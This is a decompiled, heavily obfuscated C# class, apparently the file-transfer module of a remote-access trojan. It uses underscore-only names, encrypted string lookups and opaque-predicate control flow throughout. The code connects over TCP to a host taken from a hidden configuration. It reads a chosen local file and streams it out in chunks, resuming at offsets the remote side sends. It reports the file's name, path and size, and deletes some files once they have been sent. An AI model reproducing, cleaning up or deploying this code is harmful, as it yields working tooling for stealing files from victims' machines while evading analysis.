using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public class _____________________________________
{
	private delegate void ______________________________________(string string_0);

	public string __;

	public string ___;

	public int ____;

	public int _____;

	private TcpClient m_______;

	private bool m________;

	private ______________________________________ m_________;

	public StreamWriter _________;

	public StreamReader __________;

	private string m____________;

	public string ____________;

	private event ______________________________________ _
	{
		[MethodImpl(MethodImplOptions.Synchronized)]
		add
		{
			this.m_________ = (______________________________________)Delegate.Combine(this.m_________, value);
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		remove
		{
			this.m_________ = (______________________________________)Delegate.Remove(this.m_________, value);
		}
	}

	public _____________________________________()
	{
		this.____ = 1024;
		this._____ = 0;
		this.m________ = false;
		this.m____________ = _003CModule_003E._______<string>(363088510u);
		____________ = _003CModule_003E.______<string>(2103125196u);
	}

	public unsafe void ___(string string_0)
	{
		string string_ = string_0;
		int num = ______________________._______;
		nint intPtr = (((0x400000DF ^ ((uint)num / 427613u)) == 0) ? ((nint)Type.EmptyTypes.LongLength + -1273139748) : ((nint)Type.EmptyTypes.LongLength + 24064));
		int num2 = _003CModule_003E._____________;
		nint num3;
		if ((uint)(num2 * 214 + 298 * num2) / 2134281u != 3238548885u)
		{
			if (79683584 * num != -5380)
			{
				num3 = ((1409286144 * num2 - 1468 + -4923 != -num2 + num2) ? ((nint)Type.EmptyTypes.LongLength + 25636) : ((nint)Type.EmptyTypes.LongLength + 1752630555));
			}
			else
			{
				int ______________ = _003CModule_003E._______________;
				num3 = ((~((______________ << 6) | (num * 262144)) != 64 * -______________) ? 1190942287 : 861944032);
			}
		}
		else
		{
			num3 = sizeof(ushort) + 1761230917;
		}
		string_0 = ___________________________________________________________________._(string_, _003CModule_003E.__________((int)intPtr, (int)num3, (int)((nint)Type.EmptyTypes.LongLength + 199)));
		try
		{
			while (true)
			{
				int num4;
				if (string_0.Contains(_003CModule_003E.____<string>(329123169u)))
				{
					_________();
					num4 = sizeof(Guid) + -124;
				}
				num4 = -108;
				int ________________ = _003CModule_003E._________________;
				if ((-(6 * ________________ + 58 * ________________) | (-1001521152 * ________________)) != -5906)
				{
					if (Operators.CompareString(string_0, _003CModule_003E.___<string>(616668267u), false) != 0)
					{
						break;
					}
					if (num4 == -108)
					{
						_______();
						break;
					}
				}
			}
			if (string_0.Contains(_003CModule_003E.______<string>(2665689571u)))
			{
				string value = string_0.Replace(_003CModule_003E.___<string>(3245272701u), string.Empty);
				this._.Position = Convert.ToInt32(value);
				_________();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			_______();
			ProjectData.ClearProjectError();
		}
	}

	public void ____(byte[] byte_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(byte_0, 0, byte_0.Length);
			memoryStream.Write(_____(this.m____________), 0, this.m____________.Length);
			this.m_______.Client.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			_______();
			ProjectData.ClearProjectError();
		}
	}

	public byte[] _____(string string_0)
	{
		return Encoding.Default.GetBytes(string_0);
	}

	public string ______(byte[] byte_0)
	{
		return Encoding.Default.GetString(byte_0);
	}

	public unsafe void _______()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					int num5 = _003CModule_003E.____________;
					if (-18812 == ((((uint)(53 * num5 + 11 * num5) ^ 0x2266u) != 0) ? ((nint)Type.EmptyTypes.LongLength + -18813) : (sizeof(byte) + 1524028807)))
					{
					}
					goto IL_005e;
				}
				case 204:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_003b;
						case 3:
							goto IL_0067;
						case 4:
							goto IL_0075;
						case 5:
							goto IL_0083;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_003b:
					num = 2;
					this._.Close();
					if ((nint)Type.EmptyTypes.LongLength + 29033 == -4831)
					{
						goto IL_005e;
					}
					goto IL_0067;
					IL_0075:
					num = 4;
					this._________.Close();
					goto IL_0083;
					IL_0083:
					num = 5;
					this.__________.Close();
					break;
					IL_0067:
					num = 3;
					this.m_______.Close();
					goto IL_0075;
					IL_005e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_003b;
					end_IL_0000_2:
					break;
				}
				num = 6;
				Thread.CurrentThread.Abort();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 204;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe void ________()
	{
		try
		{
			int num;
			string[] array = default(string[]);
			int num3 = default(int);
			do
			{
				if (File.Exists(__))
				{
					______________________________________________________________.______________(_003CModule_003E._______<string>(2779757176u), _003CModule_003E.___<string>(3104543174u) + __);
					num = 24864;
					if ((nint)Type.EmptyTypes.LongLength + 27646 == 13788)
					{
						goto IL_0091;
					}
					Thread.Sleep(500);
					this.m_______ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
					if (num == -7315 && (0x24FEE98Du ^ (uint)(-1944204288 * (int)((uint)num / 22855445u) * (num + num))) != 0)
					{
						goto IL_0211;
					}
					goto IL_0264;
				}
				______________________________________________________________.______________(_003CModule_003E._____<string>(3112419482u), _003CModule_003E._____<string>(784970147u) + __);
				num = 27646;
				Thread.Sleep(2000);
				return;
				IL_00b8:
				nint num2;
				while (true)
				{
					switch (num2)
					{
					case 5:
						break;
					case 6:
						if (!this.m________)
						{
							this.m________ = true;
							_ += ___;
							if (num == 30713)
							{
								goto default;
							}
						}
						goto IL_015b;
					default:
						this.m_______.SendBufferSize = 9999999;
						this._ = new FileStream(__, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						num = (int)(((num << 13) - 2907 != 2023036836) ? ((nint)Type.EmptyTypes.LongLength + -28414) : ((nint)Type.EmptyTypes.LongLength + 1680145965));
						goto case 6;
					case 4:
						if (this._____ != 0)
						{
							this._.Position = this._____;
							num2 = (nint)Type.EmptyTypes.LongLength + 5;
							continue;
						}
						break;
					case 2:
						array[3] = Path.GetFileName(__);
						array[4] = _003CModule_003E.______<string>(3060421691u);
						num3 = num;
						num = 26597;
						if (num3 != -209)
						{
							array[5] = __;
							array[6] = _003CModule_003E.___<string>(2677394803u);
							if (num == -15235)
							{
								goto IL_015b;
							}
							goto IL_0211;
						}
						goto IL_0264;
					case 1:
						array[1] = ______________________________________________________________.________________________;
						array[2] = _003CModule_003E.___<string>(2677394803u);
						num = -10767;
						num2 = sizeof(double) + -6;
						continue;
					case 0:
						goto IL_0296;
						IL_015b:
						this.m_______.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, ___________, null);
						num2 = (nint)Type.EmptyTypes.LongLength + 4;
						continue;
					}
					break;
				}
				goto IL_0091;
				IL_0296:
				array[8] = _003CModule_003E.____<string>(3008796200u);
				array[9] = this._.Position.ToString();
				continue;
				IL_0264:
				this.m_______ = new TcpClient(______________________________________________________________._____________, ______________________________________________________________.______________);
				this.m_______.ReceiveBufferSize = 9999999;
				num2 = (nint)Type.EmptyTypes.LongLength + 3;
				goto IL_00b8;
				IL_0211:
				array[7] = this._.Length.ToString();
				num = -15164;
				num2 = (nint)Type.EmptyTypes.LongLength + 0;
				goto IL_00b8;
				IL_0091:
				Thread.Sleep(3500);
				array = new string[13]
				{
					_003CModule_003E.______<string>(664265857u),
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null,
					null
				};
				num2 = (nint)Type.EmptyTypes.LongLength + 1;
				goto IL_00b8;
			}
			while (5309 + num3 == -num3 || num != -15164);
			array[10] = _003CModule_003E.______<string>(861631917u);
			array[11] = this.___;
			array[12] = _003CModule_003E._______<string>(3906612745u);
			string string_ = string.Concat(array);
			__________(string_);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E._____<string>(2571642080u), _003CModule_003E.___<string>(2721375231u) + ex2.ToString());
			_______();
			ProjectData.ClearProjectError();
		}
	}

	public unsafe void _________()
	{
		try
		{
			int num = default(int);
			MemoryStream memoryStream;
			do
			{
				byte[] array = new byte[this.____ + 1];
				if (this._.Length - this._.Position < array.Length)
				{
					goto IL_0006;
				}
				goto IL_0056;
				IL_0056:
				this._.Read(array, 0, array.Length);
				num = sizeof(short) + -18157;
				nint num2 = (nint)Type.EmptyTypes.LongLength + 1;
				goto IL_0043;
				IL_0043:
				int num3;
				switch (num3)
				{
				case 2:
					goto IL_0056;
				case 1:
					goto IL_00a7;
				}
				goto IL_0006;
				IL_00a7:
				int num4;
				do
				{
					memoryStream = new MemoryStream();
					string text = _003CModule_003E.___<string>(1874919422u) + ____________;
					num4 = num;
					num = 6505;
					if (num4 == 29603)
					{
						break;
					}
					memoryStream.Write(_____(text), 0, text.Length);
					num4 = num;
					num = -20573;
				}
				while (num4 == 28750);
				memoryStream.Write(array, 0, array.Length);
				continue;
				IL_0006:
				long length = this._.Length;
				long position = this._.Position;
				_003CModule_003E._________________ = 1898371779;
				array = new byte[(int)(length - position - 1L) + 1];
				num3 = sizeof(double) + -6;
				num2 = num3;
				goto IL_0043;
			}
			while (num != -20573);
			____(memoryStream.ToArray());
			memoryStream.Dispose();
			if (this._.Length == this._.Position)
			{
				if (__.Contains(______________________._____))
				{
					File.Delete(__);
				}
				Thread.Sleep(2000);
				_______();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			_______();
			ProjectData.ClearProjectError();
		}
	}

	public void __________(string string_0)
	{
		try
		{
			this._________ = new StreamWriter(this.m_______.GetStream());
			this._________.WriteLine(_003CModule_003E.______<string>(2701181849u) + string_0);
			this._________.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			_______();
			ProjectData.ClearProjectError();
		}
	}

	public void ___________(IAsyncResult iasyncResult_0)
	{
		try
		{
			this.__________ = new StreamReader(this.m_______.GetStream());
			this.m_________?.Invoke(this.__________.ReadLine());
			this.m_______.GetStream().BeginRead(new byte[1] { 0 }, 0, 0, ___________, null);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			_______();
			ProjectData.ClearProjectError();
		}
	}
}
